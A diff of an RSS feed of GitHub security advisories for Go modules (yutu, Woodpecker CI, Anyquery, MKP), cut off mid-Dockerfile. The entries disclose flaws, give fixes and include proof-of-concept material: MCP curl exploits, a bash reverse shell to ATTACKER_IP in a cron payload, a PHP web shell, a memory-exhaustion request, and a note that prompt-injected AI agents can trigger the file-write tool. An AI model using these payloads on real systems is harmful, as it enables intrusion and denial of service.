@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-14T18:00:17.363Z</updated>
+    <updated>2026-07-14T19:37:27.605Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,961 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/eat-pray-ai/yutu] yutu: Arbitrary File Write via MCP `caption-download` Tool]]></title>
+        <id>https://github.com/advisories/GHSA-2c7f-fxww-6w6c</id>
+        <link href="https://github.com/advisories/GHSA-2c7f-fxww-6w6c"/>
+        <updated>2026-07-14T19:34:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="arbitrary-file-write-via-mcp-caption-download-tool">Arbitrary File Write via MCP <code>caption-download</code> Tool</h2>
+<h3 id="summary">Summary</h3>
+<p>The <code>caption-download</code> MCP tool in yutu passes the caller-supplied <code>file</code> parameter directly to <code>os.Create()</code> at <code>pkg/caption/caption.go:272</code> without any path validation, canonicalization, or confinement to the <code>pkg.Root</code> boundary (<code>YUTU_ROOT</code>). A local attacker — or any process able to reach the HTTP MCP server — can write arbitrary content to any path writable by the yutu process, entirely outside the intended working directory. This is a <strong>High</strong> severity vulnerability (CVSS 7.7) with high integrity and availability impact.</p>
+<h3 id="details">Details</h3>
+<p>yutu uses <code>pkg.Root</code> (backed by Go 1.24's <code>os.OpenRoot</code>) to restrict all file I/O to the <code>YUTU_ROOT</code> directory. Every other caption file-write path honours this boundary:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Sink</th>
+<th>Confined?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Caption.Insert()</code></td>
+<td><code>pkg.Root.Open(c.File)</code> (<code>caption.go:109</code>)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Caption.Update()</code></td>
+<td><code>pkg.Root.Open(c.File)</code> (<code>caption.go:193</code>)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Caption.Download()</code></td>
+<td><code>os.Create(c.File)</code> (<code>caption.go:272</code>)</td>
+<td><strong>No</strong></td>
+</tr>
+</tbody></table>
+<p><code>Caption.Download()</code> is the sole outlier. The attacker-controlled <code>file</code> field flows without restriction from the MCP tool input schema to a raw <code>os.Create()</code> call:</p>
+<ol>
+<li><strong>Source</strong> — <code>cmd/caption/download.go:32–41</code>: <code>downloadInSchema</code> declares <code>file</code> as a required <code>string</code> field in the MCP JSON input schema.</li>
+<li><strong>Binding</strong> — <code>cmd/caption/download.go:61–64</code>: <code>cobramcp.GenToolHandler</code> maps MCP input to <code>input.Download(writer)</code>.</li>
+<li><strong>Sink</strong> — <code>pkg/caption/caption.go:272</code>: <code>os.Create(c.File)</code> creates or truncates the file at the attacker-supplied path.</li>
+<li><strong>Write</strong> — <code>pkg/caption/caption.go:280</code>: <code>file.Write(body)</code> writes the downloaded caption bytes to that path.</li>
+</ol>
+<pre><code class="language-go">// cmd/caption/download.go
+var downloadInSchema = &amp;jsonschema.Schema{
+    Required: []string{"ids", "file"},          // line 34
+    // ...
+    "file": {Type: "string", Description: fileUsage},  // line 40
+}
+
+// cobramcp.GenToolHandler binds MCP → handler (line 61-64)
+cobramcp.GenToolHandler(downloadTool, func(input caption.Caption, writer io.Writer) error {
+    return input.Download(writer)
+})
+
+// pkg/caption/caption.go
+body, err := io.ReadAll(res.Body)   // line 267
+file, err := os.Create(c.File)      // line 272  ← unconfined sink
+// ...
+_, err = file.Write(body)           // line 280
+</code></pre>
+<p>The <code>caption-download</code> tool is registered by default in <code>init()</code> at <code>cmd/caption/download.go:52</code>, and the HTTP MCP server starts with <code>--auth</code> defaulting to <code>false</code> (<code>cmd/mcp.go:42</code>), meaning no authentication is required for local HTTP callers.</p>
+<p><strong>Recommended fix:</strong></p>
+<pre><code class="language-diff">--- a/pkg/caption/caption.go
++++ b/pkg/caption/caption.go
+@@
+-       file, err := os.Create(c.File)
++       file, err := pkg.Root.OpenFile(c.File, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+        if err != nil {
+                return errors.Join(errDownloadCaption, err)
+        }
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<ul>
+<li>yutu <code>0.0.0-dev</code> / commit <code>351c99d</code></li>
+<li>Valid <code>YUTU_CREDENTIAL</code> and <code>YUTU_CACHE_TOKEN</code> available</li>
+<li>yutu MCP server running in HTTP mode</li>
+</ul>
+<p><strong>Docker-based reproduction (no live credentials needed):</strong></p>
+<p>The self-contained PoC builds a binary that exercises <code>caption.Download()</code> directly inside a container, with <code>YUTU_ROOT=/tmp/yutu_safe_root</code> as the confinement boundary.</p>
+<pre><code class="language-bash"># From the report workspace root:
+docker build --no-cache -t yutu-vuln001-poc \
+    -f vuln-001/Dockerfile \
+    reports/mcp_49_eat-pray-ai__yutu
+
+docker run --rm yutu-vuln001-poc
+</code></pre>
+<p>Expected output confirms:</p>
+<ul>
+<li><code>pkg.Root.Open("/tmp/poc-arbitrary-write.txt")</code> is correctly rejected with <code>path escapes from parent</code> (control).</li>
+<li><code>caption.Download()</code> with <code>file="/tmp/poc-arbitrary-write.txt"</code> succeeds and creates a 79-byte file <strong>outside</strong> <code>YUTU_ROOT</code> (exploit).</li>
+</ul>
+<p><strong>Live MCP server reproduction:</strong></p>
+<pre><code class="language-bash"># Start the HTTP MCP server (no auth by default)
+yutu mcp --mode http --port 8216
+
+# Initialise session
+curl -sD /tmp/yutu.headers \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  http://localhost:8216/mcp \
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1"}}}' \
+  &gt;/tmp/yutu.init
+
+SID=$(awk 'tolower($1)=="mcp-session-id:"{print $2}' /tmp/yutu.headers | tr -d '\r')
+
+# Exploit: write caption to arbitrary path
+# Replace CAPTION_ID with a caption id accessible by the configured token
+curl -s \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: application/json, text/event-stream' \
+  ${SID:+-H "Mcp-Session-Id: $SID"} \
+  http://localhost:8216/mcp \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"caption-download","arguments":{"ids":["CAPTION_ID"],"file":"/tmp/yutu-cve-poc.srt","tfmt":"srt"}}}'
+
+# Verify file was written outside YUTU_ROOT
+test -s /tmp/yutu-cve-poc.srt &amp;&amp; ls -l /tmp/yutu-cve-poc.srt
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This is an <strong>Arbitrary File Write</strong> vulnerability. Any principal that can invoke the <code>caption-download</code> MCP tool — including an unauthenticated local process when the HTTP MCP server is running with default settings (<code>--auth false</code>) — can write attacker-controlled bytes to any file path accessible to the yutu process. This bypasses the <code>YUTU_ROOT</code> confinement boundary that all other file-write operations in yutu respect.</p>
+<p><strong>Potential consequences include:</strong></p>
+<ul>
+<li>Overwriting application binaries, configuration files, or shell startup scripts to achieve persistent code execution.</li>
+<li>Corrupting log files or database files to cause denial of service.</li>
+<li>Writing web-accessible files in deployments where yutu runs alongside a web server.</li>
+<li>Exploitable via prompt injection into an AI agent that uses the yutu MCP server, since the <code>file</code> parameter is fully attacker-controlled with no guardrails.</li>
+</ul>
+<p>Impacted parties: operators running yutu as an MCP server (HTTP mode, default configuration), AI agent pipelines that expose <code>caption-download</code> to untrusted input, and any user whose machine hosts a yutu process that a local attacker can reach.</p>
+<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
+<h4 id="dockerfile"><code>Dockerfile</code></h4>
+<pre><code class="language-dockerfile"># VULN-001 PoC Dockerfile
+# Build con: reports/mcp_49_eat-pray-ai__yutu/
+# repo/ - the cloned yutu repository
+# vuln-001/ - this workspace (Dockerfile, poc_main.go)
+
+FROM golang:1.26 AS builder
+WORKDIR /build
+
+# Copy the yutu source tree (provides the vulnerable packages)
+COPY repo/ .
+
+# Inject PoC as a new command package (does not modify existing source)
+RUN mkdir -p cmd/poc_exploit
+COPY vuln-001/poc_main.go cmd/poc_exploit/main.go
+
+# Build the PoC binary (static, no CGO needed)
+RUN CGO_ENABLED=0 go build -o /poc ./cmd/poc_exploit/
+
+# ── Runtime stage ──────────────────────────────────────────────────────────
+FROM debian:12-slim
+
+COPY --from=builder /poc /poc
+
+# YUTU_ROOT defines the pkg.Root confinement boundary.
+# The PoC writes to /tmp/poc-arbitrary-write.txt which is OUTSIDE this root,
+# demonstrating the os.Create bypass.
+ENV YUTU_ROOT=/tmp/yutu_safe_root
+
+RUN mkdir -p /tmp/yutu_safe_root
+
+CMD ["/poc"]
+</code></pre>
+<h4 id="pocpy"><code>poc.py</code></h4>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+VULN-001 PoC Runner
+Exploit: Arbitrary File Write via MCP caption-download (CWE-73)
+Target : pkg/caption/caption.go:272 -- os.Create(c.File) without pkg.Root confinement
+
+Usage: python3 poc.py
+"""
+import os
+import subprocess
+import sys
+
+VULN_DIR = os.path.dirname(os.path.abspath(__file__))
+CONTEXT_DIR = os.path.dirname(VULN_DIR) # mcp_49_eat-pray-ai__yutu/
+DOCKERFILE = os.path.join(VULN_DIR, "Dockerfile")
+IMAGE_NAME = "yutu-vuln001-poc"
+
+
+def run(cmd, check=False, **kwargs):
+ print("$ " + " ".join(str(a) for a in cmd))
+ result = subprocess.run(cmd, =True, **kwargs)
+ return result
+
+
+def main():
+ print("=" * 70)
+ print("VULN-001: Arbitrary File Write via MCP caption-download")
+ print("CWE-73 | pkg/caption/caption.go:272 | os.Create(c.File)")
+ print("=" * 70)
+
+ # ── Build ────────────────────────────────────────────────────────────────
+ build_cmd = [
+ "docker", "build",
+ "--no-cache",
+ "-t", IMAGE_NAME,
+ "-f", DOCKERFILE,
+ CONTEXT_DIR,
+ ]
+ print("\n[Step 1] Building Docker image ...")
+ result = run(build_cmd, capture_output=False)
+ if result.returncode != 0:
+ print("\n[FAIL] Docker build failed.", file=sys.stderr)
+ sys.exit(1)
+
+ # ── Run ──────────────────────────────────────────────────────────────────
+ run_cmd = ["docker", "run", "--rm", IMAGE_NAME]
+ print("\n[Step 2] Running PoC container ...")
+ result = run(run_cmd, capture_output=True)
+
+ stdout = result.stdout or ""
+ stderr = result.stderr or ""
+ print(stdout, end="")
+ if stderr:
+ print(stderr, end="", file=sys.stderr)
+
+ # ── Verdict ──────────────────────────────────────────────────────────────
+ passed = (
+ result.returncode == 0
+ and "VULNERABILITY CONFIRMED" in stdout
+ and "PASS" in stdout
+ and "os.Create bypasses pkg.Root" in stdout
+ )
+
+ if passed:
+ print("\n[RESULT] PASS – vulnerability dynamically reproduced.")
+ else:
+ print(f"\n[RESULT] FAIL – container exit code {result.returncode}.", file=sys.stderr)
+ sys.exit(1)
+
+
+if __name__ == "__main__":
+ main()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/eat-pray-ai/yutu/security/advisories/GHSA-2c7f-fxww-6w6c">https://github.com/eat-pray-ai/yutu/security/advisories/GHSA-2c7f-fxww-6w6c</a></li>
+<li><a href="https://github.com/eat-pray-ai/yutu/commit/87026c4eee1ed28775383807087343a750707bf3">https://github.com/eat-pray-ai/yutu/commit/87026c4eee1ed28775383807087343a750707bf3</a></li>
+<li><a href="https://github.com/eat-pray-ai/yutu/releases/tag/v0.10.9-dev1">https://github.com/eat-pray-ai/yutu/releases/tag/v0.10.9-dev1</a></li>
+<li><a href="https://github.com/advisories/GHSA-2c7f-fxww-6w6c">https://github.com/advisories/GHSA-2c7f-fxww-6w6c</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2c7f-fxww-6w6c</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-14T19:34:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker/v3] Woodpecker gRPC agent_id metadata can be spoofed- cross-tenant agent impersonation]]></title>
+        <id>https://github.com/advisories/GHSA-g7mm-9vx7-jm7h</id>
+        <link href="https://github.com/advisories/GHSA-g7mm-9vx7-jm7h"/>
+        <updated>2026-07-14T19:00:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A vulnerability in Woodpecker CI's gRPC layer allowed any authenticated agent to impersonate any other agent on the same server by injecting a forged <code>agent_id</code> value into outgoing gRPC metadata. The server correctly verified the JWT token but then discarded the verified agent identity in favor of the client-supplied value.</p>
+<h3 id="patches">Patches</h3>
+<p>Direct patch: <a href="https://github.com/woodpecker-ci/woodpecker/pull/6567">https://github.com/woodpecker-ci/woodpecker/pull/6567</a>
+Later proper fix: <a href="https://github.com/woodpecker-ci/woodpecker/pull/6569">https://github.com/woodpecker-ci/woodpecker/pull/6569</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Disable org agents (<code>WOODPECKER_DISABLE_USER_AGENT_REGISTRATION=true</code>) and delete existing ones</p>
+<h3 id="resources">Resources</h3>
+<p>Public ref: <a href="https://github.com/woodpecker-ci/woodpecker/issues/6541">https://github.com/woodpecker-ci/woodpecker/issues/6541</a>
+Private com: <a href="https://github.com/woodpecker-ci/woodpecker-security/issues/21">https://github.com/woodpecker-ci/woodpecker-security/issues/21</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-g7mm-9vx7-jm7h">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-g7mm-9vx7-jm7h</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50141">https://nvd.nist.gov/vuln/detail/CVE-2026-50141</a></li>
+<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/21">https://github.com/woodpecker-ci/woodpecker-security/issues/21</a></li>
+<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/6541">https://github.com/woodpecker-ci/woodpecker/issues/6541</a></li>
+<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/6567">https://github.com/woodpecker-ci/woodpecker/pull/6567</a></li>
+<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/6569">https://github.com/woodpecker-ci/woodpecker/pull/6569</a></li>
+<li><a href="https://github.com/advisories/GHSA-g7mm-9vx7-jm7h">https://github.com/advisories/GHSA-g7mm-9vx7-jm7h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g7mm-9vx7-jm7h</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-14T19:00:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/julien040/anyquery] Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode]]></title>
+        <id>https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</id>
+        <link href="https://github.com/advisories/GHSA-xrcf-6jh3-ggvx"/>
+        <updated>2026-07-14T18:33:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Anyquery's <code>server</code> mode does not disable or restrict native SQLite disk manipulation commands. Unauthenticated attackers connecting to the MySQL-compatible server port can use the <code>ATTACH DATABASE</code> command to write arbitrary SQLite databases to any path on the victim's filesystem where the process has write permissions. This leads to Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) depending on the environment (e.g., by dropping a PHP web shell if a web server is running, or overwriting system cronjobs if running as root).</p>
+<h2 id="details">Details</h2>
+<p>When Anyquery is launched in <strong>Server Mode</strong> (<code>anyquery server</code>), it blindly proxies incoming SQL commands to the underlying SQLite engine. SQLite allows dynamic database mounting via the <code>ATTACH DATABASE</code> command, which creates a physical <code>.db</code> file on the filesystem if the file does not exist.</p>
+<p>An attacker can connect to the open Anyquery port, attach a new database to a sensitive path (e.g., <code>/var/www/html/shell.php</code>, <code>/etc/cron.d/pwn</code> or <code>/root/.ssh/authorized_keys</code>), create a table, and insert a malicious payload. Although the file will contain a binary SQLite header, standard Linux services like <code>cron</code>, <code>sshd</code>, and web servers like <code>PHP</code> tolerate garbage data and will parse/execute the valid payload lines injected by the attacker.</p>
+<h2 id="poc-proof-of-concept">PoC (Proof of Concept)</h2>
+<ol>
+<li><p>Start the server on the victim machine:</p>
+<pre><code class="language-bash">anyquery server --host 0.0.0.0 --port 8070
+</code></pre>
+</li>
+<li><p>Connect from an attacker machine:</p>
+<pre><code class="language-bash">mysql -u root -h &lt;VICTIM_IP&gt; -P 8070
+</code></pre>
+</li>
+<li><p>Execute the payload to write a malicious cronjob for native RCE (Note: the Anyquery process must have write permissions to the target directory, such as <code>/etc/cron.d</code> or <code>/var/spool/cron/crontabs/</code>):</p>
+<pre><code class="language-sql">ATTACH DATABASE '/etc/cron.d/pwn' AS pwn;
+CREATE TABLE pwn.task (cmd TEXT);
+INSERT INTO pwn.task VALUES ('* * * * * root /bin/bash -c "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/1337 0&gt;&amp;1"');
+</code></pre>
+<p><em>Alternatively, if a web server is running and the Anyquery process can write to the web root, you can drop a PHP shell:</em></p>
+<pre><code class="language-sql">ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
+CREATE TABLE pwn.hacked (cmd TEXT);
+INSERT INTO pwn.hacked VALUES ('&lt;?php system($_GET["cmd"]); ?&gt;');
+</code></pre>
+<p><em>If testing locally as a non-root user, you can verify the vulnerability by writing to <code>/tmp</code>:</em></p>
+<pre><code class="language-sql">ATTACH DATABASE '/tmp/pwn.db' AS pwn;
+CREATE TABLE pwn.test (cmd TEXT);
+INSERT INTO pwn.test VALUES ('Hello Anyquery AFW');
+</code></pre>
+</li>
+</ol>
+<p>Within 60 seconds, the system's cron daemon will ignore the SQLite header, parse the valid cron string, and execute the reverse shell payload with root privileges.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality:</strong> None (from the write action itself, though combined with LFR it becomes High).</li>
+<li><strong>Integrity:</strong> High. Arbitrary files can be written or overwritten, which corrupts the filesystem.</li>
+<li><strong>Availability:</strong> High. Overwriting critical system files (e.g., configurations, databases) can lead to complete Denial of Service (DoS).</li>
+<li><strong>CVSS Score:</strong> 9.1 (Critical) - <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H</code><ul>
+<li><em>Note: If the process is running with elevated privileges (e.g., root) or inside a web root directory, this escalates to Remote Code Execution (RCE) with a CVSS of 9.8 (Critical).</em></li>
+</ul>
+</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Disable dangerous SQLite functions (<code>ATTACH DATABASE</code>, <code>DETACH DATABASE</code>, etc.) when running in Server Mode. Restrict the MySQL handler so that it only permits operations on the main database or in-memory virtual tables.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/julien040/anyquery/security/advisories/GHSA-xrcf-6jh3-ggvx">https://github.com/julien040/anyquery/security/advisories/GHSA-xrcf-6jh3-ggvx</a></li>
+<li><a href="https://github.com/julien040/anyquery/releases/tag/0.4.5">https://github.com/julien040/anyquery/releases/tag/0.4.5</a></li>
+<li><a href="https://github.com/advisories/GHSA-xrcf-6jh3-ggvx">https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-14T18:33:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/StacklokLabs/mkp] MKP: Unbounded Pod Log Read via Attacker-Controlled `limitBytes`/`tailLines` Causes Memory Exhaustion]]></title>
+        <id>https://github.com/advisories/GHSA-qw5r-ppcg-f8rj</id>
+        <link href="https://github.com/advisories/GHSA-qw5r-ppcg-f8rj"/>
+        <updated>2026-07-14T18:09:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="unbounded-pod-log-read-via-attacker-controlled-limitbytestaillines-causes-memory-exhaustion">Unbounded Pod Log Read via Attacker-Controlled <code>limitBytes</code>/<code>tailLines</code> Causes Memory Exhaustion</h2>
+<h3 id="summary">Summary</h3>
+<p>The MKP (Model Context Protocol for Kubernetes) server exposes a <code>get_resource</code> MCP tool that proxies Kubernetes pod log requests. User-supplied <code>limitBytes</code> and <code>tailLines</code> parameters are parsed as unbounded <code>int64</code> values and forwarded directly to the Kubernetes API. The server then reads the entire returned log stream into an in-memory <code>bytes.Buffer</code> using <code>io.Copy</code> without any application-side size cap. A remote unauthenticated attacker can exploit this to exhaust the MKP server's memory by sending a single crafted <code>tools/call</code> request, leading to process termination (OOM kill) and denial of service. Dynamic reproduction confirmed the MKP process RSS grew from 25.8 MB to 1,179.3 MB (+1,153.4 MB) while handling one request with <code>limitBytes=134217728</code>.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability exists in <code>pkg/k8s/subresource.go</code> in the <code>buildPodLogOpts()</code> and <code>defaultGetPodLogs()</code> functions.</p>
+<p><strong>Source — unbounded parameter parsing (<code>pkg/k8s/subresource.go:171–181</code>):</strong></p>
+<pre><code class="language-go">// pkg/k8s/subresource.go
+defaultLimitBytes := int64(32 * 1024) // 32 KB — only used when parameters map is nil
+...
+if limitBytes, ok := parameters["limitBytes"]; ok {
+    if b, err := strconv.ParseInt(limitBytes, 10, 64); err == nil {
+        podLogOpts.LimitBytes = &amp;b  // no upper-bound check
+    }
+}
+if tailLines, ok := parameters["tailLines"]; ok {
+    if lines, err := strconv.ParseInt(tailLines, 10, 64); err == nil {
+        podLogOpts.TailLines = &amp;lines  // no upper-bound check
+    }
+}
+</code></pre>
+<p>When the <code>parameters</code> map is non-nil (always true for attacker-supplied input), <code>buildPodLogOpts()</code> is called at <code>pkg/k8s/subresource.go:94–96</code> and overwrites the 32 KB default entirely. The attacker can therefore supply any positive <code>int64</code> value (up to <code>2147483647</code> or <code>9223372036854775807</code>) as <code>limitBytes</code>.</p>
+<p><strong>Sink — unbounded in-memory copy (<code>pkg/k8s/subresource.go:114–115</code>):</strong></p>
+<pre><code class="language-go">buf := new(bytes.Buffer)
+_, err = io.Copy(buf, podLogs)  // entire Kubernetes stream copied into RAM
+</code></pre>
+<p>The stream from Kubernetes is read without limit into a heap-allocated <code>bytes.Buffer</code>. Subsequent JSON serialisation and MCP response wrapping create additional copies, meaning the actual RSS increase is a multiple of the raw log size (observed: ~9×).</p>
+<p><strong>Attack path (source → sink):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>cmd/server/main.go:30</code></td>
+<td>Server binds to <code>:8080</code> on all interfaces; no authentication by default</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>pkg/mcp/server.go:131</code></td>
+<td><code>NewGetResourceTool()</code> registered unconditionally (no <code>--read-write</code> required)</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>pkg/mcp/get_resource.go:28–38</code></td>
+<td>Attacker-controlled <code>parameters</code> map parsed from <code>CallToolRequest</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>pkg/mcp/get_resource.go:76</code></td>
+<td><code>client.GetResource(..., parameters)</code> called</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>pkg/k8s/subresource.go:32–33</code></td>
+<td><code>resource=pods</code> + <code>subresource=logs</code> routes into <code>getPodLogs</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>pkg/k8s/subresource.go:171–181</code></td>
+<td><code>limitBytes</code> / <code>tailLines</code> parsed without upper bound (source)</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>pkg/k8s/subresource.go:114–115</code></td>
+<td><code>io.Copy(buf, podLogs)</code> loads full stream into <code>bytes.Buffer</code> (sink)</td>
+</tr>
+</tbody></table>
+<p>The rate limiter (<code>pkg/ratelimit/config.go:16–17</code>) caps only request frequency (120 req/min) and places no limit on per-request data volume, providing no meaningful mitigation.</p>
+<p><strong>Suggested remediation:</strong></p>
+<pre><code class="language-diff">+const (
++    maxPodLogTailLines  int64 = 1000
++    maxPodLogLimitBytes int64 = 1024 * 1024  // 1 MB hard cap
++)
++
+ buf := new(bytes.Buffer)
+-_, err = io.Copy(buf, podLogs)
++limitedLogs := &amp;io.LimitedReader{R: podLogs, N: maxPodLogLimitBytes + 1}
++_, err = io.Copy(buf, limitedLogs)
++if limitedLogs.N == 0 {
++    return nil, fmt.Errorf("pod logs exceed maximum size of %d bytes", maxPodLogLimitBytes)
++}
+
+ if limitBytes, ok := parameters["limitBytes"]; ok {
+     if b, err := strconv.ParseInt(limitBytes, 10, 64); err == nil {
++        if b &lt;= 0 || b &gt; maxPodLogLimitBytes {
++            b = maxPodLogLimitBytes
++        }
+         podLogOpts.LimitBytes = &amp;b
+     }
+ }
+ if tailLines, ok := parameters["tailLines"]; ok {
+     if lines, err := strconv.ParseInt(tailLines, 10, 64); err == nil {
++        if lines &lt;= 0 || lines &gt; maxPodLogTailLines {
++            lines = maxPodLogTailLines
++        }
+         podLogOpts.TailLines = &amp;lines
+     }
+ }
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites</strong></p>
+<ul>
+<li>Docker (for self-contained reproduction)</li>
+<li>A running Kubernetes cluster with a pod whose logs are large (for real-environment testing)</li>
+<li>MKP server accessible on port 8080</li>
+</ul>
+<hr>
+<p><strong>Option A — Self-contained Docker reproduction (Phase 2 method)</strong></p>
+<p>This method uses a mock Kubernetes API that streams 128 MB of log data:</p>
+<pre><code class="language-bash"># 1. Clone the repository and enter it
+git clone https://github.com/StacklokLabs/mkp.git
+cd mkp
+
+# 2. Build the Docker image (build context is the repo root; Dockerfile is in vuln-001/)
+docker build -t mkp-vuln-001 -f vuln-001/Dockerfile .
+
+# 3. Run the exploit container — output includes RSS measurements
+docker run --rm mkp-vuln-001
+</code></pre>
+<p>Expected output (condensed):</p>
+<pre><code>Initial RSS:  26464 kB  ( 25.8 MB)
+t+01s: MKP RSS =  383080 kB  ( 374.1 MB)  [in-progress]
+t+02s: MKP RSS =  683876 kB  ( 667.8 MB)  [in-progress]
+t+03s: MKP RSS =  945008 kB  ( 922.9 MB)  [in-progress]
+t+06s: MKP RSS = 1207560 kB  (1179.3 MB)  [in-progress]
+Peak RSS: 1207572 kB (1179.3 MB)
+Delta RSS: 1181108 kB (1153.4 MB)
+VERDICT: CONFIRMED — RSS grew 1153.4 MB (limitBytes=128 MB)
+</code></pre>
+<hr>
+<p><strong>Option B — Real Kubernetes environment (manual)</strong></p>
+<pre><code class="language-bash"># 1. Build and start MKP server (default transport: streamable-http on :8080)
+git clone https://github.com/StacklokLabs/mkp.git &amp;&amp; cd mkp
+task build
+./build/mkp-server --kubeconfig=/path/to/kubeconfig
+
+# 2. Create a pod that generates large logs
+kubectl -n default run logbomb --image=busybox --restart=Never -- \
+    sh -c 'yes AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+
+# Wait ~30 seconds for logs to accumulate, then:
+
+# 3. Send the exploit request
+curl -sS http://127.0.0.1:8080/mcp \
+    -H 'Content-Type: application/json' \
+    -H 'Accept: application/json, text/event-stream' \
+    --data '{
+      "jsonrpc": "2.0",
+      "id": 1,
+      "method": "tools/call",
+      "params": {
+        "name": "get_resource",
+        "arguments": {
+          "resource_type": "namespaced",
+          "group": "",
+          "version": "v1",
+          "resource": "pods",
+          "namespace": "default",
+          "name": "logbomb",
+          "subresource": "logs",
+          "parameters": {
+            "tailLines": "999999999",
+            "limitBytes": "2147483647"
+          }
+        }
+      }
+    }'
+</code></pre>
+<p><strong>Expected observation:</strong> MKP process RSS grows rapidly during request handling. With sufficiently large logs or concurrent requests, the process is OOM-killed and the MCP endpoint becomes unavailable.</p>
+<h3 id="impact">Impact</h3>
+<p>This is an <strong>unauthenticated remote Denial of Service (DoS)</strong> vulnerability affecting any deployment of MKP server accessible over the network.</p>
+<p><strong>Who is impacted:</strong></p>
+<ul>
+<li>Any operator running <code>mkp-server</code> in its default configuration (no <code>--read-write</code> flag required; <code>get_resource</code> is registered by default on <code>:8080</code> without authentication).</li>
+<li>Kubernetes clusters whose namespaces contain pods with large accumulated logs (e.g., <code>kube-system</code> workloads in production clusters almost always satisfy this condition).</li>
+<li>Downstream consumers of the MCP interface who rely on MKP for cluster observability; an attacker can make the entire MKP service unavailable.</li>
+</ul>
+<p>A single <code>tools/call</code> request is sufficient to trigger the condition. Because the rate limiter does not cap per-request data volume, even the 120 req/min limit provides no protection: one request with <code>limitBytes=2147483647</code> (~2 GB) will exhaust memory before any subsequent requests are needed.</p>
+<p>No authentication, special privileges, or pre-existing access beyond network reachability of port 8080 is required.</p>
+<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
+<h4 id="dockerfile"><code>Dockerfile</code></h4>
+<pre><code class="language-dockerfile"># ── Stage 1: Build mkp-server ─────────────────────────────────────────────────
+FROM golang:1.25 AS builder
+
+# GOTOOLCHAIN=local prevents Go from trying to download a newer toolchain
+# matching the go 1.25.5 directive in go.mod; any Go 1.25.x is sufficient.
+ENV GOTOOLCHAIN=local
+ENV CGO_ENABLED=0
+
